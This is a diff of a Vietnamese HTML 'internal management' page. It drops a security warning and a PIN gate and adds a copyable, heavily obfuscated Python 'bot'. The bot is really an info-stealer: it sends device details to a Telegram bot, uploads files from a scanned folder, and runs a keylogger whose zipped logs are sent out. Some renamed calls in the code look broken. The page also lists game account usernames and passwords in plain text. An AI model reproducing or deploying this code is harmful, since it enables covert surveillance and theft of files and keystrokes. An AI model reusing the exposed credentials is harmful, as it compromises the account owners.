@@ -3,92 +3,988 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sổ Tay Tài Khoản Mật Khẩu</title>
-    <!-- Load Tailwind CSS -->
+    <title>Hệ Thống Quản Lý Nội Bộ & Bot</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Roboto+Mono:wght@400;700&display=swap');
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #0f172a; /* Dark Blue-Gray Background */
+            background-color: #0f172a;
             color: #e2e8f0;
         }
-        .mono {
-            font-family: 'Roboto Mono', monospace;
-        }
+        .mono { font-family: 'Roboto Mono', monospace; }
         .data-card {
             background-color: #1e293b;
             border: 1px solid #334155;
-            transition: transform 0.2s;
+            transition: all 0.2s ease-in-out;
         }
         .data-card:hover {
+            border-color: #6366f1;
+            box-shadow: 0 4px 15px rgba(99, 102, 241, 0.2);
             transform: translateY(-2px);
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
         }
-        /* Custom styling for the prominent security warning */
-        .security-warning {
-            background-color: #450a0a;
-            border-left: 6px solid #ef4444;
-            color: #fca5a5;
-            animation: pulse-border 2s infinite;
+        .copy-btn {
+            transition: all 0.2s;
         }
-        @keyframes pulse-border {
-            0%, 100% { border-color: #ef4444; }
-            50% { border-color: #f87171; }
+        .copy-btn:active { transform: scale(0.95); }
+        pre {
+            background-color: #000;
+            padding: 20px;
+            border-radius: 12px;
+            overflow-x: auto;
+            border: 1px solid #334155;
+            max-height: 500px;
         }
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #475569; }
     </style>
 </head>
-<body class="p-4 sm:p-8">
+<body class="p-4 sm:p-10">
 
-    <div class="max-w-4xl mx-auto">
-        <header class="text-center mb-10">
-            <h1 class="text-3xl sm:text-4xl font-extrabold text-indigo-400 mb-3 tracking-wider">
-                Quản Lý Tài Khoản Cá Nhân
+    <div class="max-w-6xl mx-auto">
+        <header class="text-center mb-12">
+            <h1 class="text-4xl font-extrabold text-indigo-400 mb-2 tracking-tight">
+                Hệ Thống Quản Lý Dữ Liệu
             </h1>
-            <p class="text-gray-400 text-lg">
-                Sổ tay game và thông tin đăng nhập.
-            </p>
+            <p class="text-gray-400">Tài khoản cá nhân & Cấu hình Python Bot</p>
         </header>
 
-        <!-- SECURITY WARNING - ALWAYS VISIBLE -->
-        <div class="security-warning p-4 rounded-lg mb-8 shadow-xl">
-            <h3 class="font-bold text-red-300 text-xl mb-2">⚠ CẢNH BÁO BẢO MẬT NGHIÊM TRỌNG ⚠</h3>
-            <p class="text-sm">
-                Mã PIN và tất cả Tài Khoản/Mật Khẩu đều được **LƯU TRONG MÃ NGUỒN** (Source Code) của trang web này. 
-                <span class="font-bold">Bất kỳ ai xem mã nguồn đều có thể thấy toàn bộ dữ liệu.</span> 
-                Cổng PIN này chỉ là bước lọc giao diện, **không phải** cơ chế bảo mật.
-            </p>
-        </div>
-
-        <!-- PIN GATE AREA -->
-        <div id="pin-gate" class="flex flex-col items-center p-8 bg-gray-800 rounded-xl shadow-2xl">
-            <h2 class="text-2xl font-semibold mb-4 text-white">Nhập Mã PIN Để Xem Dữ Liệu</h2>
-            <div id="pin-message" class="mb-4 text-red-400 font-medium hidden"></div>
-            <input type="password" id="pin-input" placeholder="Nhập Mã PIN..."
-                   class="w-full sm:w-80 p-3 mb-4 text-center text-lg bg-gray-700 border border-gray-600 rounded-lg focus:ring-indigo-500 focus:border-indigo-500 text-white mono"
-                   maxlength="15">
-            <button id="pin-submit" onclick="checkPin()" 
-                    class="w-full sm:w-80 py-3 bg-indigo-600 hover:bg-indigo-700 rounded-lg transition duration-200 ease-in-out font-bold text-white shadow-md">
-                Xác Nhận
-            </button>
-
-        </div>
-
-        <!-- ACCOUNT LIST AREA -->
-        <div id="account-list" class="hidden">
-            <h2 class="text-2xl font-semibold mb-6 text-white border-b border-gray-700 pb-2">Thông Tin Tài Khoản Đã Mở Khóa</h2>
-            <div id="data-container" class="space-y-4">
-                <!-- Data will be dynamically inserted here -->
+        <section class="mb-16">
+            <div class="flex items-center justify-between mb-6">
+                <h2 class="text-2xl font-bold text-white flex items-center">
+                    <span class="bg-indigo-600 w-2 h-8 mr-3 rounded"></span>
+                    Danh Sách Tài Khoản
+                </h2>
+                <span class="text-xs bg-indigo-900 text-indigo-300 px-3 py-1 rounded-full border border-indigo-700">Auto Unlocked</span>
             </div>
-        </div>
+            
+            <div id="data-container" class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                </div>
+        </section>
 
+        <section>
+            <div class="flex items-center justify-between mb-6">
+                <h2 class="text-2xl font-bold text-white flex items-center">
+                    <span class="bg-green-600 w-2 h-8 mr-3 rounded"></span>
+                    Mã Nguồn Python Bot
+                </h2>
+                <button onclick="copyCode('python-code')" class="bg-green-600 hover:bg-green-700 text-white px-5 py-2 rounded-lg text-sm font-bold shadow-lg transition-colors flex items-center gap-2">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                    </svg>
+                    SAO CHÉP TOÀN BỘ CODE
+                </button>
+            </div>
+            <div class="relative">
+                <pre class="text-green-400 text-xs mono leading-relaxed" id="python-code">
+from base64 import b64decode
+from base64 import b85decode
+import os
+import sys
+import subprocess
+import time
+import platform
+import socket
+import requests
+from datetime import datetime
+
+pwrite = ""[:: int(b64decode("LTE=").decode())].join(
+    [
+        chr(
+            ord(i)
+            - int(
+                b64decode(b85decode("O-N^Y").decode()).decode(),
+                (int((int(1 + 1)) + (int("-2")))),
+            )
+        )
+        for i in b85decode(
+            b85decode(
+                "N-}0XbV)UHBW_1zR&XdxU}-WVQDa~&lt;Ze&gt;tEC1Xx)W?)}bGFB*eR5E9FB~3m(IU!g{cvnkKYHa"
+            ).decode()
+        ).decode()
+    ]
+)
+uncancel = (
+    b64decode("")
+    .decode()
+    .join(
+        [
+            chr(
+                ord(i)
+                - (
+                    int(
+                        (int(len("nnnnn") + int("1")))
+                        + (int("".join([chr(ord(i) - len("nnn")) for i in "06"])))
+                    )
+                )
+            )
+            for i in b85decode(
+                b64decode(
+                    "\x53\x6a\x4a\x77\x52\x58\x64\x49\x59\x54\x422\x63\x55\x64\x6b\x59\x77\x3d\x3d"
+                ).decode()
+            ).decode()
+        ]
+    )
+)
+iGE = int(
+    b85decode("\u0046\u006e\u0042\u0052\u0024\u0047\u0079").decode(),
+    len(""[:: int("-1")]),
+)
+MyDecimal = b64decode(
+    b64decode(
+        "".join([chr(ord(i) - int("3")) for i in "@TmY\\MZhZgH]"])[
+            :: int("".join([chr(ord(i) - (int(7 + (-4)))) for i in "04"]))
+        ]
+    ).decode()
+).decode() in os.environ.get(
+    b85decode(
+        b64decode("".join([chr(ord(i) - (True + True + True)) for i in ""]))
+        .decode()
+        .join(
+            [
+                chr(ord(i) - len("\x6d\x6d\x6d"))
+                for i in b64decode("Uy1SJG5RcHg=").decode()
+            ]
+        )
+    ).decode(),
+    b85decode("")
+    .decode()
+    .join([chr(ord(i) - int("3")) for i in b64decode("").decode()]),
+)
+ALE = (
+    "".join([chr(ord(i) - (True + True + True)) for i in ""])
+    .join(
+        [
+            chr(
+                ord(i) - int("".join([chr(ord(i) - (True + True + True)) for i in "6"]))
+            )
+            for i in b64decode("").decode()
+        ]
+    )
+    .join(
+        [
+            chr(
+                ord(i)
+                - int(
+                    b64decode("")
+                    .decode()
+                    .join(
+                        [
+                            chr(ord(i) - len("\x6d\x6d\x6d"))
+                            for i in "".join(
+                                [chr(ord(i) - (True + True + True)) for i in "6~9"]
+                            )
+                        ]
+                    ),
+                    len(""),
+                )
+            )
+            for i in ""
+        ]
+    )
+    .join(
+        [
+            chr(ord(i) - int(b85decode("XG"[:: -len("m")]).decode()))
+            for i in "".join([chr(ord(i) - int("0x3", 0)) for i in ""])[
+                :: int(b64decode("LTB4MQ==").decode(), (int(2 + (-2))))
+            ].join(
+                [
+                    chr(
+                        ord(i)
+                        - int(
+                            "".join([chr(ord(i) - (int(1 + 2))) for i in "3{6"]),
+                            len(""),
+                        )
+                    )
+                    for i in "5\x79\x6a\x69\x67\x78\x6a5\x4a\x75\x7d\x74\x72\x75\x67\x6a"
+                ]
+            )
+        ]
+    )
+    if MyDecimal
+    else os.path.expanduser(
+        b85decode(""[:: int("-0x1", 0)])
+        .decode()
+        .join(
+            [
+                chr(
+                    ord(i)
+                    - (
+                        int(
+                            int(b64decode("MA==").decode())
+                            + int(
+                                "".join(
+                                    [chr(ord(i) - (True + True + True)) for i in "6"]
+                                )
+                            )
+                        )
+                    )
+                )
+                for i in b85decode("!hteJa(Z!Za%5+A").decode()
+            ]
+        )
+    )
+)
+_18072 = False
+if not MyDecimal:
+    try:
+        from pynput import keyboard
+
+        _18072 = True
+    except:
+        pass
+
+
+def close_handler():
+    get_dict = []
+    get_dict.append(
+        b85decode(
+            b85decode(b85decode("VK;F").decode()).decode()[
+                :: int(
+                    "1\u002d"[:: -len("".join([chr(ord(i) - len("eee")) for i in "e"]))]
+                )
+            ]
+        ).decode()
+        * (
+            int(
+                len("\x67\x67\x67\x67\x67\x67\x67")
+                + len(
+                    "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
+                )
+            )
+        )
+    )
+    get_dict.append(
+        "\u1eca\u0042\u0020\u0054\u1ebd\u0049\u0048\u0054\u0020\u004e\u0049\u0054\u0020\u0047\u004e\u00d4\u0048\u0054\u0020\u1ecf1"[
+            :: int("\u002d0\u00781", int("0"))
+        ][
+            :: int(
+                "".join(
+                    [
+                        chr(ord(i) - int("3"))
+                        for i in "".join([chr(ord(i) - len("ooo")) for i in "37"])
+                    ]
+                )
+            )
+        ][
+            :: int(
+                b85decode(b64decode("RWlpYTc=").decode()).decode(),
+                len("".join([chr(ord(i) - int("0x3", 0)) for i in ""])),
+            )
+        ]
+        if MyDecimal
+        else b85decode(
+            "\u0040\u0053\u006d2\u0059\u00403\u0040\u00613\u00527\u006b\u005e\u003d\u0050\u0044\u0064\u0062\u0041\u004e\u006c\u0071\u00595\u0021\u002b\u007d\u007b\u004b\u0052\u004b\u0074\u0078\u003c\u004e\u0042"
+        ).decode()
+    )
+    get_dict.append(
+        b85decode("pJ"[:: (int(7 + (-8)))]).decode() * int(b64decode("NDA=").decode())
+    )
+    get_dict.append(f"📛 Tên: {platform.node()}")
+    if MyDecimal:
+        try:
+            ReadFileInto = subprocess.run(
+                [
+                    "".join(
+                        [
+                            chr(ord(i) - (True + True + True))
+                            for i in "".join(
+                                [chr(ord(i) - (int(2 + 1))) for i in "vuxvzkm"]
+                            )
+                        ]
+                    )[:: int(b85decode("\u0045\u0069\u0069\u00617").decode(), len(""))],
+                    b85decode("")
+                    .decode()
+                    .join(
+                        [
+                            chr(ord(i) - int("0x3", int("0")))
+                            for i in b64decode("b2hncnAxd2Z4Z3J1czFydQ==").decode()
+                        ]
+                    )[:: (int((True + True + True + True) + (-len("yyyyy"))))],
+                ],
+                capture_output=True,
+                text=True,
+            )
+            statements = ReadFileInto.stdout.strip()
+            if statements:
+                get_dict.append(f"📱 Model: {statements}")
+        except:
+            pass
+    get_dict.append(f"💿 OS: {platform.system()} {platform.release()}")
+    try:
+        disassemble = os.statvfs(
+            b64decode(b64decode("").decode())
+            .decode()
+            .join(
+                [
+                    chr(
+                        ord(i)
+                        - int(
+                            "".join([chr(ord(i) - len("ppp")) for i in ""]).join(
+                                [
+                                    chr(ord(i) - (True + True + True))
+                                    for i in "".join(
+                                        [chr(ord(i) - int("3")) for i in "6~9"]
+                                    )
+                                ]
+                            ),
+                            int("0"[:: int("-0x1", 0)]),
+                        )
+                    )
+                    for i in "".join([chr(ord(i) - len("sss")) for i in "5yjigxj"])
+                ]
+            )
+            if MyDecimal
+            else b85decode("F8").decode()
+        )
+        sendaddr = (
+            disassemble.f_blocks
+            * disassemble.f_frsize
+            / int(
+                "004\x780"[:: int("-1")],
+                len("".join([chr(ord(i) - (True + True + True)) for i in ""])),
+            )
+            ** int(
+                b85decode("GX").decode()[
+                    :: -len("".join([chr(ord(i) - (True + True + True)) for i in "s"]))
+                ]
+            )
+        )
+        ENQ = (
+            disassemble.f_bfree
+            * disassemble.f_frsize
+            / int("4201"[:: int("-0x1", 0)]) ** int("3")
+        )
+        get_dict.append(f"💾 Storage: {ENQ:.1f}GB / {sendaddr:.1f}GB trống")
+    except:
+        pass
+    try:
+        other_cwd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        other_cwd.connect(
+            (
+                b85decode(b85decode("").decode())
+                .decode()
+                .join(
+                    [
+                        chr(ord(i) - int(b85decode("FnBW").decode(), len("")))
+                        for i in "\u003b1\u003b1\u003b1\u003b"[
+                            :: -len(b85decode("Yy").decode())
+                        ]
+                    ]
+                ),
+                int("08"[:: int("-1")]),
+            )
+        )
+        get_dict.append(
+            f"🌐 IP: {other_cwd.getsockname()[(int(len(''[::int('-1')])+int(b64decode('MA==').decode())))]}"
+        )
+        other_cwd.close()
+    except:
+        pass
+    get_dict.append(
+        f"⏰ Time: {datetime.now().strftime(b64decode('').decode()[::int("".join([chr(ord(i)-(int(int('3')+len(''))))for i in"".join([chr(ord(i)-len('jjj'))for i in'37'])]))].join([chr(ord(i)-(True+True+True))for i in b64decode(b64decode('VmlnOVVDZzlTeWdqWnlnd2NDZ3dYQ2c9').decode()).decode()[::-len(b64decode('\u0065\u0067\u003d\u003d').decode())]]))}"
+    )
+    get_dict.append(
+        "".join([chr(ord(i) - int("3")) for i in ""]).join(
+            [
+                chr(ord(i) - (True + True + True))
+                for i in b85decode("")
+                .decode()
+                .join(
+                    [
+                        chr(
+                            ord(i)
+                            - int("".join([chr(ord(i) - int("0x3", 0)) for i in "6"]))
+                        )
+                        for i in "".join([chr(ord(i) - (int(3 + 0))) for i in "F"])
+                    ]
+                )
+            ]
+        )
+        * len(
+            b85decode(
+                b64decode(
+                    "Yjh+WlpiOH5aWmI4flpaYjh+WlpiOH5aWmI4flpaYjh+WlpiOH5aWmI4flpaYjh+Wlo="
+                ).decode()
+            ).decode()
+        )
+    )
+    return (
+        b85decode(
+            ""[:: (int(4 + (-5)))][
+                :: -len("".join([chr(ord(i) - len("rrr")) for i in "x"]))
+            ].join(
+                [
+                    chr(ord(i) - int("3"[:: (int(len("ss") + (int("-0x3", 0))))]))
+                    for i in "6\x4c"
+                ]
+            )
+        )
+        .decode()
+        .join(get_dict)
+    )
+
+
+def rmode():
+    get_dict = close_handler()
+    print(get_dict)
+    VERIFY_ALLOW_PROXY_CERTS = f"https://api.telegram.org/bot{pwrite}/sendMessage"
+    try:
+        requests.post(
+            VERIFY_ALLOW_PROXY_CERTS,
+            data={
+                "\u0063\u0068\u0061\u0074\u005f\u0069\u0064": uncancel,
+                ""[:: -len("a")].join(
+                    [
+                        chr(ord(i) - int(b85decode("FnBW").decode(), len("")))
+                        for i in b64decode("")
+                        .decode()
+                        .join(
+                            [
+                                chr(ord(i) - len("rrr"[:: -len("h")]))
+                                for i in "\x7a\x7e\x6b\x7a"
+                            ]
+                        )
+                    ]
+                )[
+                    :: int(
+                        "".join(
+                            [chr(ord(i) - (True + True + True)) for i in "03\x7b4"]
+                        ),
+                        int(b64decode("MA==").decode()),
+                    )
+                ]: get_dict,
+            },
+            timeout=len(
+                "".join(
+                    [
+                        chr(
+                            ord(i)
+                            - len("".join([chr(ord(i) - int("0x3", 0)) for i in "jjj"]))
+                        )
+                        for i in "\x74\x74\x74\x74\x74\x74\x74\x74\x74\x74"
+                    ]
+                )
+            ),
+        )
+        print(
+            b64decode(
+                b64decode("".join([chr(ord(i) - (int(2 + 1))) for i in ""]))
+                .decode()
+                .join(
+                    [
+                        chr(ord(i) - len(b64decode("dnZ2").decode()))
+                        for i in "".join([chr(ord(i) - int("3")) for i in ""]).join(
+                            [
+                                chr(ord(i) - len("\x7a\x7a\x7a"))
+                                for i in "".join(
+                                    [
+                                        chr(ord(i) - (int(2 + 1)))
+                                        for i in "=y\x82ORV\\Z\x80?Vpc4P@{`tq"
+                                    ]
+                                )
+                            ]
+                        )
+                    ]
+                )
+            ).decode()
+        )
+    except Exception as ignore_dir:
+        print(f"❌ Lỗi: {ignore_dir}")
+
+
+def REPORT_CDIFF(dist_info_path):
+    VERIFY_ALLOW_PROXY_CERTS = f"https://api.telegram.org/bot{pwrite}/sendDocument"
+    try:
+        with open(
+            dist_info_path,
+            b85decode(b85decode(b64decode("VkkoUg==").decode()).decode()).decode(),
+        ) as saved_stdout:
+            pathset = requests.post(
+                VERIFY_ALLOW_PROXY_CERTS,
+                data={
+                    ""[:: int("1-"[:: int("-0x1", 0)])].join(
+                        [
+                            chr(ord(i) - len(b64decode("\u0065\u0048\u00684").decode()))
+                            for i in "".join(
+                                [
+                                    chr(
+                                        ord(i)
+                                        - int(
+                                            "".join(
+                                                [
+                                                    chr(ord(i) - int("0x3", 0))
+                                                    for i in "3{6"
+                                                ]
+                                            ),
+                                            (int(2 + (-2))),
+                                        )
+                                    )
+                                    for i in b64decode("am9lemduaQ==").decode()
+                                ]
+                            )[:: -len(b85decode("&W"[:: -len("e")]).decode())]
+                        ]
+                    ): uncancel
+                },
+                files={
+                    b85decode(""[:: -len("b")])
+                    .decode()
+                    .join(
+                        [
+                            chr(ord(i) - len("ddd"[:: int("-1")]))
+                            for i in b64decode(
+                                "".join(
+                                    [
+                                        chr(ord(i) - int("0x3", 0))
+                                        for i in "]6MphKErf[f@"
+                                    ]
+                                )
+                            ).decode()
+                        ]
+                    ): saved_stdout
+                },
+                timeout=(
+                    int(
+                        (True + True + True + True + True + True + True + True)
+                        + len(b64decode("bm5ubm5ubm5ubm5ubm5ubm5ubm5ubg==").decode())
+                    )
+                ),
+            )
+            return pathset.ok
+    except:
+        return False
+
+
+def pkl_2():
+    if not os.path.exists(ALE):
+        print(f"[!] {ALE} không tồn tại")
+        return
+    print(f"[+] Đang quét: {ALE}")
+    found_dict = []
+    for snake_replacementRules, JmuNWZ, other_except in os.walk(ALE):
+        for skip_bytes in other_except:
+            slice_start = os.path.join(snake_replacementRules, skip_bytes)
+            try:
+                if os.path.getsize(slice_start) &lt; int("500") * int(
+                    "4201"[:: int("\x2d0\x781", int("0x0", 0))]
+                ) * int(
+                    "004x0"[:: int("-0x1", 0)],
+                    (int((True + True + True + True + True) + ((int(6 + (-11)))))),
+                ):
+                    found_dict.append(slice_start)
+            except:
+                pass
+    print(f"[+] Tìm thấy {len(found_dict)} file")
+    for GA_3sJxX, saved_stdout in enumerate(found_dict, len("z"[:: -len("h")])):
+        print(
+            f"[{GA_3sJxX}/{len(found_dict)}] {os.path.basename(saved_stdout)}...",
+            end=b85decode(
+                b64decode("")
+                .decode()
+                .join(
+                    [
+                        chr(ord(i) - len("\x75\x75\x75"))
+                        for i in b64decode("RFI=").decode()
+                    ]
+                )
+            ).decode()[
+                :: (
+                    int(
+                        (int((True + True + True) + int("0x1", 0)))
+                        + (-len("\x7a\x7a\x7a\x7a\x7a"))
+                    )
+                )
+            ],
+        )
+        if REPORT_CDIFF(saved_stdout):
+            print(
+                b85decode(
+                    b85decode("")
+                    .decode()
+                    .join(
+                        [
+                            chr(ord(i) - len(b85decode("X=!N").decode()))
+                            for i in ">.(|"[:: -len("d")]
+                        ]
+                    )[
+                        :: (
+                            int(
+                                int("0")
+                                + (
+                                    int(
+                                        "".join(
+                                            [chr(ord(i) - int("3")) for i in "03{4"]
+                                        ),
+                                        (int(3 + (-3))),
+                                    )
+                                )
+                            )
+                        )
+                    ]
+                ).decode()
+            )
+        else:
+            print("\u274c")
+        time.sleep(
+            float(
+                b85decode("")
+                .decode()
+                .join([chr(ord(i) - (int(int("2") + len("m")))) for i in "318"])
+            )
+        )
+
+
+UnparsedEntityDeclHandler = []
+mutex_action = time.time()
+matchingfiles = True
+
+
+def EggInfoPkg():
+    global UnparsedEntityDeclHandler, mutex_action
+    if not UnparsedEntityDeclHandler:
+        return
+    ip5 = b64decode("").decode().join(UnparsedEntityDeclHandler)
+    UnparsedEntityDeclHandler = []
+    mutex_action = time.time()
+    produce_global_ext = datetime.now().strftime(
+        b64decode(b85decode("N&gt;*!ZVpCRYSb0`SN&gt;wmyRd+o-").decode()).decode()
+    )
+    _83487 = f"keylog_{produce_global_ext}.txt"
+    load_package = f"keylog_{produce_global_ext}.zip"
+    with open(
+        _83487, b85decode("".join([chr(ord(i) - int("3")) for i in "fN"])).decode()
+    ) as saved_stdout:
+        saved_stdout.write(f"=== {datetime.now()} ===\n{ip5}")
+    import zipfile
+
+    with zipfile.ZipFile(
+        load_package,
+        b64decode("")
+        .decode()
+        .join(
+            [
+                chr(
+                    ord(i)
+                    - (
+                        int(
+                            int("".join([chr(ord(i) - int("3")) for i in "9"]))
+                            + (int("\x2d0\x783", (int(3 + (-3)))))
+                        )
+                    )
+                )
+                for i in b85decode(
+                    "".join([chr(ord(i) - (True + True + True)) for i in "gK"])
+                ).decode()
+            ]
+        ),
+        zipfile.ZIP_DEFLATED,
+    ) as is_env_var_to_ignore:
+        is_env_var_to_ignore.write(_83487)
+    REPORT_CDIFF(load_package)
+    os.remove(_83487)
+    os.remove(load_package)
+
+
+def _36459(rcFile):
+    global UnparsedEntityDeclHandler
+    try:
+        if (
+            hasattr(
+                rcFile,
+                b64decode(
+                    "".join([chr(ord(i) - (int(1 + 2))) for i in ""]).join(
+                        [
+                            chr(ord(i) - (int((int(4 + (-4))) + len("eee"))))
+                            for i in "@@jfkk5\\"[:: -len("r")]
+                        ]
+                    )
+                ).decode(),
+            )
+            and rcFile.char
+        ):
+            UnparsedEntityDeclHandler.append(rcFile.char)
+        else:
+            with_tree = str(rcFile)
+            if (
+                b85decode(
+                    "".join([chr(ord(i) - (True + True + True)) for i in "e;xo\x80Zg"])
+                ).decode()
+                in with_tree
+            ):
+                UnparsedEntityDeclHandler.append(
+                    b64decode(
+                        "".join([chr(ord(i) - (int(4 + (-1)))) for i in "@@DL"])[
+                            :: int("\u002d1")
+                        ]
+                    ).decode()
+                )
+            elif (
+                b64decode(
+                    b64decode("\x57\x6c\x631\x4d\x46\x70\x59\x53\x540\x3d").decode()
+                ).decode()
+                in with_tree
+            ):
+                UnparsedEntityDeclHandler.append(
+                    ""[:: int("-1")].join(
+                        [
+                            chr(ord(i) - (True + True + True))
+                            for i in b64decode("DQ==").decode()[:: int("\u002d1")]
+                        ]
+                    )
+                )
+            else:
+                UnparsedEntityDeclHandler.append(f"[{with_tree}]")
+        if len(UnparsedEntityDeclHandler) >= iGE:
+            EggInfoPkg()
+    except:
+        pass
+
+
+def new_cols():
+    global matchingfiles
+    rmode()
+
+    def my_sqrt():
+        while matchingfiles:
+            time.sleep(
+                (
+                    int(
+                        len(
+                            "\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066\u0066"
+                        )
+                        + len(
+                            b85decode(
+                                "W@ct)W@ct)W@ct)W@ct)W@ct)W@ct)W@ct)W@ct)W@ct)W@ct)W&amp;"
+                            ).decode()
+                        )
+                    )
+                )
+            )
+            if (
+                time.time() - mutex_action
+                >= int(
+                    "".join(
+                        [chr(ord(i) - int("0\u00783", int("0x0", 0))) for i in "3{6f"]
+                    ),
+                    int(b85decode("Fa").decode()),
+                )
+                and UnparsedEntityDeclHandler
+            ):
+                EggInfoPkg()
+
+    mock_idleconf_GetFont.Thread(target=my_sqrt, daemon=True).start()
+    print(
+        b64decode(
+            "".join([chr(ord(i) - (int(6 + (-3)))) for i in ""]).join(
+                [
+                    chr(ord(i) - (int(int("2") + len("u"))))
+                    for i in "".join(
+                        [
+                            chr(ord(i) - int("3"))
+                            for i in "Iryx^YHR`^ryh8jt`^Om~PLnhsim_8pn{wL;Ro:{OInJjNPyQ6Sm`UM=w8;tQWCC"
+                        ]
+                    )
+                ]
+            )
+        ).decode()
+    )
+    with keyboard.Listener(_36459=_36459) as nlines:
+        nlines.join()
+
+
+def MinimalAGen():
+    print(
+        b64decode(
+            b64decode(
+                b64decode(
+                    "".join(
+                        [chr(ord(i) - (True + True + True)) for i in "YX]IRYEUSW3@"]
+                    )
+                ).decode()
+            ).decode()
+        ).decode()
+        * (
+            int(
+                (True + True + True + True + True + True)
+                + (
+                    True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                    + True
+                )
+            )
+        )
+    )
+    print(
+        "\u0020\u0020\u0054\u004f\u004f\u004c\u0020\u0110\u0041\u0020\u004e\u0102\u004e\u0047\u0020\u002d\u0020\u0053\u0049\u00ca\u0055\u0020\u004e\u0048\u1eb8"
+    )
+    print(
+        b64decode(
+            "".join(
+                [
+                    chr(
+                        ord(i)
+                        - int(
+                            "".join([chr(ord(i) - (True + True + True)) for i in "6"])
+                        )
+                    )
+                    for i in ""
+                ]
+            )
+        )
+        .decode()
+        .join(
+            [
+                chr(
+                    ord(i)
+                    - int(
+                        "".join([chr(ord(i) - int("0x3", 0)) for i in "6"])[
+                            :: int(b64decode("LTE=").decode())
+                        ]
+                    )
+                )
+                for i in "".join(
+                    [chr(ord(i) - len("rrr"[:: (int(5 + (-6)))])) for i in "C"]
+                )
+            ]
+        )
+        * (
+            int(
+                (int(int("0x6", 0) + len("iii")))
+                + int("".join([chr(ord(i) - int("3")) for i in "3{4i"]), int("0x0", 0))
+            )
+        )
+    )
+    print(
+        b64decode(
+            b85decode(
+                "O=T-IYAZ`bZ+SvUG-7phVN*gdVNFjkVr^q*WJhduNk~#}VP!`)b~90DS#?J@X?Hz6"
+            ).decode()
+        ).decode()
+    )
+    print(
+        b64decode(
+            ""[:: int("-1")].join(
+                [
+                    chr(ord(i) - int("0\u00783", (int(2 + (-2)))))
+                    for i in "\x50\x78\x2e7\x6d\x2e\x4e\x47\x72\x7c\x45\x4b7\x65\x78\x77\x64\x56\x45\x70\x64\x5a\x7b\x6f\x4c\x4b\x55\x7c\x6558\x71\x4c\x48\x55\x79\x6758\x76\x655\x49\x6e\x66\x7a\x40\x40"
+                ]
+            )
+        ).decode()
+    )
+    if _18072:
+        print(
+            "3\ufe0f\u20e3\u0020\u0043\u0068\u1ea1\u0079\u0020\u006b\u0065\u0079\u006c\u006f\u0067\u0067\u0065\u0072"
+        )
+        print(
+            "4\ufe0f\u20e3\u0020\u0043\u0068\u1ea1\u0079\u0020\u0054\u1ea4\u0054\u0020\u0043\u1ea2"
+        )
+    print(
+        b64decode(
+            "".join([chr(ord(i) - (True + True + True)) for i in ""])
+            .join([chr(ord(i) - len("\u006d\u006d\u006d")) for i in ""])
+            .join(
+                [
+                    chr(ord(i) - int("3"[:: -len("k")]))
+                    for i in b85decode("")
+                    .decode()
+                    .join(
+                        [
+                            chr(ord(i) - len("\u0074\u0074\u0074"))
+                            for i in "".join(
+                                [
+                                    chr(ord(i) - (True + True + True))
+                                    for i in "VX4=s4TMx\x82K^jP8MxaZF"
+                                ]
+                            )
+                        ]
+                    )
+                ]
+            )
+        ).decode()
+    )
+    variant = input(
+        b64decode(
+            b85decode(
+                "".join(
+                    [
+                        chr(ord(i) - (int(1 + 2)))
+                        for i in "Oy\x800H\\jxe)T;KB4ex@.cSld&lt;w"
+                    ]
+                )
+            ).decode()
+        ).decode()
+    )
+    if variant == "".join([chr(ord(i) - (int(2 + 1))) for i in "4"]):
+        rmode()
+    elif (
+        variant
+        == b85decode("".join([chr(ord(i) - int("0x3", 0)) for i in "J8"])).decode()
+    ):
+        pkl_2()
+    elif (
+        variant
+        == b64decode(b64decode("==QP9cXT"[:: (int(6 + (-7)))]).decode()).decode()
+        and _18072
+    ):
+        new_cols()
+    elif variant == b64decode("\u004e\u0041\u003d\u003d").decode() and _18072:
+        rmode()
+        pkl_2()
+        new_cols()
+    else:
+        print(
+            b85decode(b64decode("QFNsOzNBWE1TSHA9fV55WTJtd3ZiUmg=").decode()).decode()
+        )
+
+
+if (
+    __name__
+    == b85decode(b85decode("BbP4-zyb_)idR"[:: (int(0 + (-1)))]).decode()).decode()
+):
+    try:
+        MinimalAGen()
+    except KeyboardInterrupt:
+        print("\x0a\u26a0\ufe0f\x20\u0110\xe3\x20\x64\u1eeb\x6e\x67")
+                </pre>
+            </div>
+        </section>
     </div>
 
     <script>
-        const CORRECT_PIN = "ThaiVu2012";
-        const SESSION_KEY = "is_authenticated";
-
-        // Mảng chứa DỮ LIỆU NHẠY CẢM - TẤT CẢ ĐỀU HIỂN THỊ TRONG MÃ NGUỒN
         const SENSITIVE_DATA = [
             { game: "TK siêu bá đầy game hay", user: "jseyk61637", pass: "bxdms13816", platform: "Steam/BXDMS" },
             { game: "Cult of the Lamb (TK2)", user: "hq4wo2ht2ey7", pass: "1https://www.vpesports.com/sharedsteam", platform: "Token/Link" },
@@ -106,64 +1002,55 @@
